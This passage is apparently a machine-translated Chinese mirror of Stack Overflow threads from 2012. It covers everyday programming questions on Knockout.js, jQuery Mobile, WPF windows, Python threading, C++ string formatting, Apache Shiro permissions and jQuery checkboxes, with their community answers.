                FlashVars="langStyle=Styles_jp.swf&langId=jp_JP&langSource=jp_JP.xml"><embed> 
```

# knockout.js - 当我在 Knockout.js 中选择单选按钮的其他选项时查找单选按钮的先前值

> ID：10603612
> 
> 赞同：0
> 
> 时间：2012-05-15T15:04:57.477
> 
> 标签：knockout.js

我在使用淘汰赛 js 时遇到问题。这里我使用的是可观察数组，其中属性名称 selectedItem 与单选按钮选中属性绑定。当我更改任何选项时，我想要单击的先前值和当前值。

```
<div style="font-size: 11px; line-height: 1.28; margin-left: 5px; margin-top: 10px;"
      data-bind="foreach:OptionDetail">
  <div>
    **<input  type="radio" class="mts" style="float: left; margin-left: 5px" data-bind="attr:{name:ParentCourseItemID,value:OptionDescription},click:function($root,event){SaveOptionForPoll($root,Option,SelectedItemID)},checked:SelectedItemID" />**
  </div>
  <input type="hidden" data-bind="attr:{id:'hdnSelectOption'+CourseItemID}" />
  <div data-bind="event: { mouseover: $root.ShowVoteCount, mouseout: $root.HideVoteCount }" style="margin-bottom: 5px; border: 1px solid #CCC; background-color: white;
                                zoom: 1; float: left; width: 210px; margin-left: 5px; height: 25px;">
    <div style="text-align: left; float: left; margin-top: 5px; margin-left: 5px;" data-bind="html:OptionDescription">
    </div>
    <div style="float: right; display:none; width: 50px; background-color: yellow; height: 52%; padding: 6px;"
        data-bind="attr:{id:'poll'+CourseItemID}">
      <span style="margin-right:5px;" data-bind="text:VoteCount"></span>Votes
    </div>
  </div>
  <div style="padding-left: 5px; padding-right: 5px; height: 100%">
    <span style="position: relative; top: 4px"></span>
  </div>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T16:58:14.553

每次当前值更改时，您不能只记录以前的值。就像是。

```
var viewModel = function(data) {
    var self = this;
    this.value = ko.observable();
    this.previousValue = ko.observable(this.value());

    this.value.subscribe(function (newValue) {
        console.log("current value: " + newValue + " previousValue: " 
               + self.previousValue());
        // do something with previous value
        self.previousValue(self.value());    
    });
};

ko.applyBindings(new viewModel()); 
```

[http://jsfiddle.net/madcapnmckay/2ZwDm​​/1/](http://jsfiddle.net/madcapnmckay/2ZwDm/1/)

希望这可以帮助。

# asp.net-mvc-3 - jquerymobile 和 asp.net mvc 3 在弹出对话框中有导航栏

> ID：10603613
> 
> 赞同：0
> 
> 时间：2012-05-15T15:04:58.163
> 
> 标签：asp.net-mvc-3, jquery-mobile

我正在使用 JQuerymobile，我的一个链接具有 data-rel="dialog" 属性，该属性在对话框中启动我的页面。但是我注意到启动的页面有来自主页的导航栏和标题。

任何想法为什么会发生这种情况？

我的 _layout.cshtml 是：

```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>@ViewBag.Title</title>
<script src="../../Scripts/jquery-1.6.4.js" type="text/javascript"></script>
<script src="../../Scripts/jquery.mobile-1.1.0.js" type="text/javascript"></script>
<link href="../../Content/jquery.mobile-1.1.0.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div data-role="page">
    <div data-role="header">
        <h1>Page Title</h1>
        <div data-role="footer">
            <div data-role="navbar">
                <ul>
                    <li><a href="#">One</a></li>
                    <li><a href="#">Two</a></li>
                    <li><a href="#">Three</a></li>
                </ul>
            </div>
            <!-- /navbar -->
        </div>
    </div>
    <!-- /header -->
    <div data-role="content">
        @RenderBody()
    </div>
    <!-- /content -->
    <div data-role="footer">
        <h4>Page Footer</h4>
    </div>
    <!-- /footer -->
</div>
<!-- /page --> 
```

index.cshtml 是：

```
@{
   ViewBag.Title = "Home Page";
}
<h2>@ViewBag.Message</h2>
<ul>
    <li>@Html.ActionLink("Home", "Index", "Home", null, new { data_rel = "dialog" })</li>
    <li>@Html.ActionLink("About", "About", "Home", null, new { data_rel = "dialog" })</li>
</ul> 
```

about.cshtml 是：

```
@{
    ViewBag.Title = "About Us";
}

<h2>About</h2>
<p>
     Put content here.
</p> 
```

因此，我将 About.cshtml 显示为对话框弹出窗口，但其中也显示了标题和导航栏（我不希望显示此内容）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:32:26.593

_layout.cshtml 默认为每个视图页加载。要覆盖此行为，请尝试在 about.cshtml 中包含类似的内容：

```
@{
     Layout = "~/_dialogLayout.cshtml";
 } 
```

或者根本没有加载布局页面

```
@{
     Layout = "";
 } 
```

# c# - 如何打开窗口但将其显示在我的启动屏幕下方？

> ID：10603614
> 
> 赞同：0
> 
> 时间：2012-05-15T15:04:59.490
> 
> 标签：c#, wpf, window, startup

我的 App.xaml.cs 中有以下逻辑。首先，在完成一些初始化时会显示启动画面。在某个时刻，我已经进行了足够的初始化以显示我的主应用程序窗口。但是，我希望启动画面继续显示，直到所有需要的数据都被缓存。我遇到的问题是，当我显示主窗口时，它总是显示在启动屏幕的顶部。在显示之前，我尝试在主窗口上将 ShowActivated 属性设置为 false，但它仍然显示在初始屏幕上。有任何想法吗？

```
protected override void OnStartup(StartupEventArgs e)
{
  base.OnStartup(e);

  _splashWindow = new SplashWindow();

  _splashWindow.Show();

  ...

  _mainWindow = new MainWindow();
  _mainWindow.DataContext = new MainViewModel();
  _mainWindow.ShowActivated = false;
  _window.Show();
}

private void OnCacheLoadComplete(object sender, EventArgs e)
{
  _splashWindow.Close();
} 
```

解决方案：

```
 _mainWindow = new MainWindow();
  _mainWindow.DataContext = new MainViewModel();
  _window.Show();
  _splashWindow.TopMost = true;
  _splashWindow.Owner = _window; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:07:05.853

你有没有尝试过

```
_splashWindow.Owner = _window; 
```

调用后`_window.Show()`？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:16:01.293

没有`TopMost`可以设置的属性吗？

[http://msdn.microsoft.com/en-us/library/ms748948.aspx](http://msdn.microsoft.com/en-us/library/ms748948.aspx)

里面有一些好东西。看起来您应该设置 TopMost 以及所有权。

# eclipse-plugin - Notepad++ 的 Eclipse 插件

> ID：10603615
> 
> 赞同：7
> 
> 时间：2012-05-15T15:05:04.633
> 
> 标签：eclipse-plugin, notepad++

我已经尝试将 Notepad++ 关联为我在 Eclipse 中的某些文件类型的默认编辑器。但是，它们在外部窗口中打开。我希望它们在我的 IDE 中打开。

是否有任何 Eclipse 插件可以将 Notepad++ 集成到 Eclipse 中作为内部编辑器？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-17T04:35:12.033

最接近的现有项目是[Jintilla ，它为 Eclipse 提供了使用](http://sourceforge.net/projects/jintilla/)[Scintilla](http://sourceforge.net/apps/mediawiki/notepad-plus/index.php?title=Notepad%2B%2B_And_Scintilla)的集成路径。通过将 JAR 文件放在 plugins 目录中来安装它，然后重新启动 Eclipse。

# c# - C# 在运行时构建菜单、commandHandlers 和哈希表

> ID：10603618
> 
> 赞同：2
> 
> 时间：2012-05-15T15:05:07.203
> 
> 标签：c#, menu, menuitem

我是 C# 的（非常）新手，我正在尝试用这种语言实现现有的应用程序元模型。在这个元模型中，“菜单”表包含表单和操作的组合，为每个表单指示哪些操作应该可用。

然后我可以使用这个“菜单”数据源在运行时构建和显示表单的特定 MenuStrip。菜单 (ToolStripMenuItem) 中的每个项目都包含相应的“操作”字符串。单击此项目应启动相应的命令。

那么现在的问题是：如何将 ToolStripmenuItem 的操作字符串链接到相应的命令？

我的第一个想法是维护一个包含操作字符串作为键的 HashTable，以及要执行的方法，如下所示：

一个通用的 CommandHandler 方法：

```
delegate void CommandHandler(string[] args); 
```

并且，在我的主模块中，一个看起来像这样的 HashTable

```
myHashCommandTable.Add 
    (   "issueThePurchaseOrder", 
        new CommandHandler(PurchaseOrder.IssueThePurchaseOrder)) 
```

然后我可以在运行时运行相应的命令：

```
if myHashCommandTable.ContainsKey(myActionString)
{
    ((CommandHandler)myHashCommandTable[myActionString])
} 
```

但这将迫使我“手动”维护这个 HashTable，它很快就会成为开发人员的麻烦源，以及应用程序的不稳定！还有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:16:42.177

我想您可以将目标方法的名称存储在数据源中，然后使用反射在运行时查找它。将数据传递给目标方法会很棘手，但这只是您要克服的另一个令人兴奋的挑战！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:18:47.480

您可以允许模型同时保存动作名称和方法 - 有几种不同的方式。

```
<action name="issueThePurchaseOrder" run="PurchaseOrder.IssueThePurchaseOrder"/> 
```

当你阅读文件时，要么使用反射来找到你的运行命令，

或者在将“运行命令”映射到方法的代码中有第二个表。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T15:21:50.037

与@itsme86 类似，真正使用Actionstring with Reflection 来查找表单上的方法。如果你想要更高层次的抽象 ActionString 可以是一个属性值，你可以用它来装饰它执行的方法。

两者的一个很好的结果是您可以添加一些测试代码来比较菜单项和操作，并查找元数据和实现之间的不匹配。

# java - 为什么我的 Eclipse 调试器第一次无法进入？

> ID：10603620
> 
> 赞同：1
> 
> 时间：2012-05-15T15:05:19.480
> 
> 标签：java, eclipse

我是 Java 新手，正在学习在 Eclipse 中进行调试。我收到一个奇怪的错误，其中调试器第一次无法进入函数，但第二次成功。具体来说，这是我的步骤。

1.  跨步直到我达到我想要检查的功能。
2.  进入函数。这是我遇到错误“找不到源”的时候。
3.  步退。调试器成功返回到上面的上一个堆栈帧。
4.  再次进入函数。奇怪的是，这次踏入作品。

有什么问题？为什么需要两个“步骤”来检查我想要的功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T16:18:56.313

当一行中有两个语句并且内部语句没有源（例如裸露的 JRE）时，可能会发生这种情况。

```
myObject.myMethod(someObject.toString()); 
```

在这一行中，第一步进入，将进入内部对象的 toString() 方法（可能没有可用的源），第二步进入将进入您自己的方法（将有代码） .

解决这个问题的方法（如果它发生在常规 Java 运行时类中）是为您的项目使用[完整的 JDK](http://www.oracle.com/technetwork/java/javase/downloads/jdk-6u32-downloads-1594644.html)而不是 JRE，并遵循良好的编码实践并将内部语句移动到变量中，以便每一行都执行一个事情（优化器应该确保这样做不会造成性能损失）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T16:19:32.203

如果你有这样的行：

```
func1(obj.func2()); 
```

调试器首先进入 obj.func2() 如果它是第三方源代码或 java src 并且您使用 jre，您可能会错过此源代码并且 eclipse 将无法附加源代码进行调试（使用 maven！=））。

在下一个“步入”中，您将进入 func1

# python - Python中线程之间的信号传递

> ID：10603622
> 
> 赞同：0
> 
> 时间：2012-05-15T15:05:41.400
> 
> 标签：python, multithreading, celery

我正在开发一个实时数据采集器。我有一个 while True 循环，在其中，我生成了执行相对较小任务的线程（我正在通过 HTTP 查询第 3 方 API，为了实现快速并行查询）。

每个线程都负责更新特定的数据系列。这可能需要 2、3 甚至 5 秒。但是，我的 while True 循环产生线程的速度可能比线程完成所需的时间要快。因此，我需要生成的线程等待它们之前的线程完成。

一般来说，由于线程查询 HTTP 服务器，线程完成需要多长时间是不可预测的......

我正在考虑为每个线程创建一个命名信号量，然后如果为特定系列生成的线程发现以前的线程在同一系列上工作，它将等待。

我能看到的唯一问题是线程可能积压..

这里最好的解决方案是什么？我应该研究像芹菜这样的东西吗？我目前正在使用线程模块。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:26:45.173

不！拜托，看在你的上帝或聪明的设计师的份上，不要那样做！不要不断地创建/产生/任何线程并尝试对它们进行微观管理。线程池 - 在启动时创建一些线程并将它们传递给生产者-消费者队列以等待代表这些 HTTP 任务的类实例。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:26:58.180

你应该使用`Queue.Queue`. 为每个系列创建一个队列，并在该队列上侦听一个线程。每次您需要阅读一个系列时，将一个请求放入队列中。线程等待队列中的项目，每收到一个项目，它就会读取数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T16:40:25.573

如果您只是在每次查询返回时重新查询 API，则可以使用的另一个选项是一个异步框架，例如 Twisted（[他们关于线程的教程](http://twistedmatrix.com/documents/current/core/howto/threading.html)）。我是一个相对的 Twisted 初学者，所以可能有比这更好的方法来扭曲 Twisted 来完成你的任务 -

```
from twisted.internet import reactor, defer
def simple_task():
    status = query_your_api()
    return status

def repeating_call(status):
    print(status)
    d = threads.deferToThread(simple_task)
    d.addCallback(repeating_call)

data_series = [data1, data2, data3]
for data in data_series:
    repeating_call('starting everything up')

reactor.run() 
```

# maven - Maven 中心仅包含 pom。如何添加罐子？

> ID：10603626
> 
> 赞同：0
> 
> 时间：2012-05-15T15:06:02.080
> 
> 标签：maven, pom.xml

我正在尝试 mavenize 一个使用 IBM MQ 的项目。在我们的 Nexus 服务器中，只有 pom 存在：

```
<dependency>
  <groupId>com.ibm</groupId>
  <artifactId>com.ibm.mq</artifactId>
  <version>5.3.07</version>
  <type>pom</type>
</dependency> 
```

据我了解，MQ 是专有软件。我确实有 MQ 的 jar 文件。如何将这些添加到项目中，并保留 pom.xml 指定的依赖项。

我可以将 jars 上传到我们的 Nexus，因此它还包含 jar（带有 pom），或者我可以在项目中添加一个 pom 依赖项和一些系统或导入的 cand 吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T16:52:24.763

我建议您将 jar 上传到您的公司存储库中。这样，任何开发人员都可以毫无问题地使用此依赖项。您只需要使用以下 2 个选项执行[deploy:deploy-file ：](http://maven.apache.org/plugins/maven-deploy-plugin/deploy-file-mojo.html)

*   相同的 groupId、artifactId、版本
*   `-DgeneratePom=false`

# tinymce - Tinymce 主题修改 renderHTML

> ID：10603627
> 
> 赞同：1
> 
> 时间：2012-05-15T15:06:03.483
> 
> 标签：tinymce

我正在为 TinyMCE 创建一个主题，并且需要更改按钮在编辑器上的呈现方式。

我可以通过在 renderHTML 方法中修改主要**tiny_mce.js文件中的一些代码来做到这一点：**

```
 renderHTML : function() {
        var cp = this.classPrefix, s = this.settings, h, l;

        l = DOM.encode(s.label || '');
        h = '<a role="button" id="' + this.id + '" href="javascript:;" class="' + cp + ' ' + cp + 'Enabled ' + s['class'] + (l ? ' ' + cp + 'Labeled' : '') +'" onmousedown="return false;" onclick="return false;" aria-labelledby="' + this.id + '_voice" title="' + DOM.encode(s.title) + '">';
        if (s.image && !(this.editor  &&this.editor.forcedHighContrastMode) )
            h += '<img class="mceIcon" src="' + s.image + '" alt="' + DOM.encode(s.title) + '" />' + l;
        else
            h += '<span class="mceIcon ' + s['class'] + '"></span>' + (l ? '<span class="' + cp + 'Label">' + l + '</span>' : '');

        h += '<span class="mceVoiceLabel mceIconOnly" style="display: none;" id="' + this.id + '_voice">' + s.title + '</span>'; 
        h += '</a>';
        return h;
    }, 
```

但是，我需要为我正在创建的特定主题完成此操作。有没有办法不触及主要的 tiny_mce.js 源文件，而是修改主题的**editor_template.js**文件中的 renderHTML 方法行为？我只是无法找到一种方法来做到这一点。

# emacs - Emacs 其他窗口或上一个缓冲区

> ID：10603629
> 
> 赞同：2
> 
> 时间：2012-05-15T15:06:05.100
> 
> 标签：emacs, window, buffer

为了减少我必须记住的击键次数，我想要一个功能

a) 当只有一个窗口/框架时切换到前一个缓冲区
b) 如果有另一个窗口/框架，则切换到另一个窗口/框架（与 other-window-or-frame/other-window/other-frame 相同）

到目前为止，我发现......什么都没有！而且我的 elisp 技能......他们正在改进，但我没有设法为自己编写一个解决方案。有什么想法（或很难找到的包）吗？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T16:07:56.043

这是一个 elisp 函数，如果有多个可见窗口，则切换窗口，否则直接切换到前一个缓冲区：

```
(defun other-window-or-previous-buffer ()
  "Switches windows if more than one window, otherwise switches buffers."
  (interactive)
  (if (> (count-windows) 1)
      (other-window 1)
    (switch-to-buffer (other-buffer)))) 
```

# php - 带有 JS 的弹出窗口和带有参数的 innerHTML

> ID：10603633
> 
> 赞同：0
> 
> 时间：2012-05-15T15:06:14.137
> 
> 标签：php, parameters, parameter-passing, innerhtml, popupwindow

我有一个 JS 文件，我用 innerHTML 做一个链接，我传递了 2 个参数。代码是：

```
innerHTML  = "<a href='http://tamarp.someee.com/test.php?code="+row[cur].name+"&name="+row[cur].real+"'>ADD</a>"; 
```

它工作正常，但我希望此链接位于弹出窗口中。我应该在这里添加什么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:08:07.907

添加`target="_blank"`.

`innerHTML = "<a href='http://tamarp.someee.com/test.php?code="+row[cur].name+"&name="+row[cur].real+"' target='_blank'>ADD</a>";`

# c++ - c++消息查找表(iostream)

> ID：10603635
> 
> 赞同：0
> 
> 时间：2012-05-15T15:06:18.003
> 
> 标签：c++, string, formatting

在 C++ 中是否有一种简单的方法来拥有一个允许使用变量的消息查找表。

例如在 C 中你可以有这样的东西：

```
const char* transaction_messages[] = {
"UNAUTHORIZED",
"UNKNOWN_ORDER",
"UNKNOWN_DEALER",
"UNKNOWN_COMMODITY",
"INVALID_MESSAGE",
"BOUGHT %d %s @ %f.1 FROM %s", //amount, commodity, price, dealer
"SOLD %d %s @ %f.1 FROM %s", //amount, commodity, price, dealer
"%d HAS BEEN FILLED", //order id
"%d HAS BEEN REVOKED", //order id
"%d %s %s %s %d %f.1 HAS BEEN POSTED", //order id, dealer, side, commodity, amount, price
"%d %s %s %s %d %f.1" //order id, dealer, side, commodity, amount, price
}; 
```

然后在这样的函数中使用它：

```
void myfunction(int amount, char* commodity, double price, char* dealer){

    char *msg = transaction_message[6];
    printf(msg, amount, commodity, price, dealer);
} 
```

我希望能够对 ostream 执行相同操作，而不必对 << 运算符执行相同的操作：

```
ostream << "BOUGHT" << amount << " " << commodity << " @ " << price << " FROM " << dealer; 
```

我现在能想到的唯一方法是拥有一堆返回字符串的内联函数，而不是拥有一个 char* 表，而是拥有一个查找内联函数的函数表。必须有一个更简单的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:30:04.303

您所做的与本地化 (AKA L10N) 非常相似。

对此有几个问题：[字符串本地化设计的最佳方式](https://stackoverflow.com/q/185291/14065)

但是有几个包已经处理了这个问题。
这些基本上旨在从您的应用程序中获取所有字符串并将它们打包到单独的资源中（在运行时选择正确的资源（通常取决于语言环境））。但是他们通常使用“英语”（或者我应该说非英语程序员的原始文本）作为查找文本来查找正确的资源字符串（因此代码仍然对开发人员可读）并且用户获得特定语言显示的字符串。

当然boost也有一个

*   [boost::本地化](http://www.boost.org/doc/libs/1_49_0/libs/locale/doc/)

但还有其他（快速谷歌发现）

*   GNU[获取文本](http://www.gnu.org/software/gettext/)
*   GNU [libiconv](http://www.gnu.org/software/libiconv/)

其他资源：

*   [http://en.wikipedia.org/wiki/GNU_gettext](http://en.wikipedia.org/wiki/GNU_gettext)
*   [http://site.icu-project.org/](http://site.icu-project.org/)

但获得正确的字符串只是成功的一半。然后，您需要正确地将运行时值与字符串中的占位符交换。就个人而言，这是我认为[boost::format](http://www.boost.org/doc/libs/1_49_0/libs/format/)真正闪耀的地方。

例子：

```
sprintf("The time is %s in %s.", time, country); 
```

问题是名词和动词的顺序因语言而异。例如，如果我们翻译

> “德国时间是12:00。”

进入阿塞拜疆

> “Saat Almaniya 12:00 deyil。”

您会注意到“德国”（Almaniya）这个词随着时间交换了位置。因此，按特定顺序替换项目的简单任务不起作用。您需要的是索引占位符。（助推::格式救援）。

```
std::cout << boost::formt("The time is %1 in %2.") << time << country;
// Notice the place holders are number '%1' means the first bound argument
// But the format string allows you to place them in any order in the string
// So your localized resource will look like this:

std::cout << boost::formt("Saat %2 saat %1 deyil.") % time % country; 
```

或者更有可能：

```
std::cout << boost::formt(I10N.get("The time is %1 in %2.")) % time % country; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:16:34.460

在 C++[`boost::format`](http://www.boost.org/doc/libs/1_49_0/libs/format/doc/format.html)中可以用作类型安全的`sprintf()`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:17:14.580

怎么样：

```
ostream& ToString(ostream&O, int amount, char* commodity, double price, char* dealer)
{
  char buf[80];

  char *msg = transaction_message[6];
  sprintf(msg, amount, commodity, price, dealer);

  return O << buf;
} 
```

# java - 如何检查 Shiro 权限以获取元素列表？

> ID：10603636
> 
> 赞同：1
> 
> 时间：2012-05-15T15:06:18.163
> 
> 标签：java, grails, shiro

我有 Hibernate 请求，它返回要显示的元素列表。我需要检查当前用户是否能够查看每个返回的元素。我可以这样做

```
for (Element e : elements) { 
    SecurityUtils.getSubject().hasPermission("element:view:" + e.id);   
} 
```

但是此代码将为每个元素生成 x 个对数据库的请求。所以检查的速度将是O(n)。

如何改进我的解决方案？是否有可能获得 O(1) 的速度？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-16T03:48:50.673

有一个在 Subject 上调用的方法，如果 Subject 拥有所有权限`isPermittedAll(String ...)`，它将返回。`true`

见：[http ://shiro.apache.org/static/current/apidocs/org/apache/shiro/subject/Subject.html#isPermittedAll%28java.lang.String...%29](http://shiro.apache.org/static/current/apidocs/org/apache/shiro/subject/Subject.html#isPermittedAll%28java.lang.String...%29)

虽然，老实说，我不知道它在数据库查询方面效率多少（如果有的话）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T10:27:49.357

shiro 支持缓存，如果你这个列表构造很多，你可以使用这种类型的动作。 [http://shiro.apache.org/caching.html](http://shiro.apache.org/caching.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-17T20:18:53.303

鉴于您的示例，您可能想要执行以下操作：

```
String[] permissions = new String[elements.size()];

for (int i = 0; i < elements.size(); i++) {
    permissions[i] =  "element:view:" + e.id;
}

boolean[] allowed = SecurityUtils.getSubject().isPermitted(permissions);

List<Element> allowedElements = new ArrayList<Element>();

for (int i = 0; i < elements.size(); i++) {
    //1:1 match on entries in allowed to elements
    if (allowed[i]) {
        allowedElements.add(elements[i]);
    }
}

//allowedElements now contains the set of elements the user is permitted to access
return allowedElements; 
```

我使用的 Subject API 方法在这里：[boolean[] isPermitted(String... permissions)](http://shiro.apache.org/static/current/apidocs/org/apache/shiro/subject/Subject.html#isPermitted%28java.lang.String...%29)

这种方法的缺点是您实际上最终会迭代您的元素列表两次。但是，由于您不必为每个元素进行数据库调用，因此您最终会保存。

需要注意的一点是，您的运行时间可能会根据您的安全[领域](http://shiro.apache.org/realm.html)的实现方式而改变。

# custom-controls - XPages：动态包含基于重复值的自定义控件？

> ID：10603638
> 
> 赞同：2
> 
> 时间：2012-05-15T15:06:26.570
> 
> 标签：custom-controls, xpages, repeat, xpages-ssjs

我有一个自定义控件，我在其中循环通过配置对象为我的界面构建选项卡。

我使用 repat-control 循环配置并基于该值我希望包含不同的自定义控件。

我想过使用包含页面控件，但这似乎不可能，因为它不能使用我的重复控件变量。

我可以列出我所有的控件并根据重复的值隐藏/显示它们，但这不是一个非常优雅的解决方案。

我错过了什么吗？或者是否可以根据重复值**包含**页面/自定义控件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:38:18.757

不是“开箱即用”——在页面中包含一个控件是在页面加载时做出的决定（想想 ${} 时间范围）——如果你愿意，你可以使用 Java 注入控件。否则，我会查看 ExtLib 中的动态内容控件，它允许您在运行时以编程方式选择特定方面。然后根据需要从组件树中动态添加或删除每个构面（而不是切换构面，因为这基本上允许您在两个不同的构面之间动态选择，例如一个用于“只读”，另一个用于“编辑”）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:33:14.357

你试过 Ext Lib 的 SwitchFacet 控制吗？

# matlab - 在Matlab中将三列数据框重塑为矩阵

> ID：10603640
> 
> 赞同：0
> 
> 时间：2012-05-15T15:06:35.743
> 
> 标签：matlab, matrix

在 MATLAB 中，我的数据如下所示：

```
 5 7 1 
    5 8 2 
    5 9 3 
    6 7 3 
    6 8 3 
    6 9 2 
```

其中每一列都是一个数组（例如`x = [5; 5; 5; 6; 6; 6]`）。我希望以以下方式将数据放入矩阵形式：

```
 7    8    9
    5   1    2    3
    6   3    3    2 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:21:34.053

这是你需要的吗？

```
>> x =[5 7 1
       5 8 2
       5 9 3
       6 7 3
       6 8 3
       6 9 2];
>> rowlabels = unique(x(:,1))
rowlabels =
     5
     6
>> collabels = unique(x(:,2))'
collabels =
     7     8     9
>> data = reshape(x(:,3),numel(collabels),numel(rowlabels))'
data =
     1     2     3
     3     3     2 
```

# c# - 从字节数组加载 1bpp 位图

> ID：10603641
> 
> 赞同：0
> 
> 时间：2012-05-15T15:06:37.143
> 
> 标签：c#, winapi, bitmap, handle

我必须从字节数组中加载一个 1bpp 位图以将其提供给外部组件。该组件需要位图句柄。

我试图将它加载到一个`Bitmap`对象并提供 的结果`bitmap.GetHBitmap()`，但它看起来像在内部完成了一些奇怪的转换，并且生成的位图不再是 1bpp（当我提供组件的句柄时，它抱怨位深度） .

当我直接使用 Windows API 函数从文件加载位图时，`LoadImage`它工作正常，但我不想从文件中读取它们，因为我已经在内存中拥有图像。将它们写入磁盘并再次读取它们是不必要的 I/O，并且会大大降低我的应用程序的速度。

如何获取位图的句柄，其数据位于字节数组中？

**编辑：**

我试过这段代码，但它显示了两个不同的图像。它应该显示相同的图像。

```
IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * imageData.Length);
try
{
    Marshal.Copy(imageData, 0, ptr, imageData.Length);
    handle = CreateBitmap(imgWidth, imgHeight, 1, 1, ptr);

    ShowImage(Image.FromHbitmap(handle));
    ShowImage(Image.FromStream(new MemoryStream(imageData)));
}
finally
{
    Marshal.FreeHGlobal(ptr);
} 
```

# javascript - 检查表单输入是否存在

> ID：10603644
> 
> 赞同：8
> 
> 时间：2012-05-15T15:06:48.770
> 
> 标签：javascript

当用户填写输入名称“field1”时，我想检查是否存在名为“field2”的输入标签。我通过使用field1标记`onchange`上的事件执行 JavaScript 函数来做到这一点。`input`（我正在使用警告框进行测试。）如果 field2 不存在，JavaScript 会单击一个按钮并更新表单以同时包含 field1 和 field2。但是，无论我使用 3 种方法中的哪一种，即使 field2 存在，也会弹出警报框。`if`我尝试了使用with`null`和`'undefined'`等的各种组合。

如果 field2 存在，为什么会弹出警报框？

```
function foobar(){

if(!document.getElementsByName("field2"){
alert("foobar");
}

if(!document.forms[0].field2){
alert("foobar");
}

if(!document.forms[0].elements.namedItem("field2"){
alert("foobar");
}
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T15:07:38.640

您缺少一个括号：`if(!document.getElementsByName("field2"))`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-16T11:13:25.487

实际上，问题在于页面有多种形式，因此`forms[0]`不是指我想要的形式。所以我认为最好的方法是直接使用`this`和引用该`input`字段。`undefined`此外，与而不是比较更清楚`!`。

这有效：

```
function foobar(fooform){
    if (fooform.field2 === undefined) {
        alert("foobar");
    }
} 
```

像这样调用：

```
foobar(this.form); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-01-24T06:41:25.453

只是为了更新，因为使用 getElementsByName 并与 null 比较不再正常工作。现在有效的是检查元素的长度。

```
if(document.getElementsByName("field2").length<=0) {
  // then field2 does not exist
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-04-10T18:39:54.763

```
var element = document.getElementsByName("field2");
if(typeof(element) == 'undefined' && element != null)
{
// Field exists
}
else
{
// then field does not exist
} 
```

# jquery - Jquery，使用变量获取输入值

> ID：10603646
> 
> 赞同：0
> 
> 时间：2012-05-15T15:06:54.210
> 
> 标签：jquery, post, checkbox

我有一个发布操作，当它成功时，我调用一个方法并传递一个 json 结果。然后我循环遍历每个 json 对象，在那个循环中我想获得一个带有对象 id 作为值属性的复选框，这是我的做法：

```
$.each(roles, function (index, role) {
        var checkboxes = $('input[value="role.RoleId"][type="checkbox"]').attr("checked",true);

    }); 
```

如您所见，我有一个复选框列表，当它们的值属性等于“role.RoleId”时，我想选择它们。但是我做不到，我该怎么做？

编辑：那么我如何选择该复选框的包装元素。在里面 。所以我还需要选择元素？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:08:08.470

您应该使用`.prop`而不是`.attr`.

```
.prop("checked",true); 
```

您还需要附加 role.RoleId.. 见下文，

```
$.each(roles, function (index, role) {
        var checkboxes = $('input:checkbox[value="' + role.RoleId + '"]').prop("checked",true);
}); 
```

[**演示**](http://jsfiddle.net/skram/7yvGR/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:10:09.767

您必须像这样使用 value 或 role.RoleId

```
 var checkboxes = $('input[value="'+role.RoleId+'"][type="checkbox"]').attr("checked",true); 
```

因为角色是来自 $.each 循环的对象。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:10:17.257

```
 var checkboxes = $('input[value="'+role.RoleId+'"][type="checkbox"]').prop("checked",true); 
```

但是为复选框设置 id 会使问题更简单。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T15:21:19.227

您可以使用`:checkbox`选择器将代码缩短一点：

```
$(":checkbox[value=" + role.RoleId + "]").prop("checked", true); 
```

您想在这里使用连接，这样就不会按字面意思解释为纯文本，`role.RoleId`而是我们想*使用*.`role.RoleId`

# php - 捕获自动增量值并将其存储在查询中

> ID：10603648
> 
> 赞同：0
> 
> 时间：2012-05-15T15:07:01.717
> 
> 标签：php, mysql

